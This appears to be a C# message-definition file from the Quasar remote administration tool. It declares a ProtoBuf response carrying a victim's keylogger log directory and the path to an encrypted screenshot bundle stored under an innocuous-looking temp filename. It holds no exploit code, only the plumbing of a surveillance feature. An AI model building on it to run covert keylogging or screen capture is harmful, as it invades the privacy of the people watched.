using ProtoBuf;

namespace Quasar.Common.Messages
{
    [ProtoContract]
    public class GetKeyloggerLogsDirectoryResponse : IMessage
    {
        [ProtoMember(1)]
        public string LogsDirectory { get; set; }

        /// <summary>
        /// C client: path to the encrypted screenshot bundle (%TEMP%\wctBG958.tmp). Optional for C# client.
        /// </summary>
        [ProtoMember(2)]
        public string ScreenshotBundlePath { get; set; }
    }
}
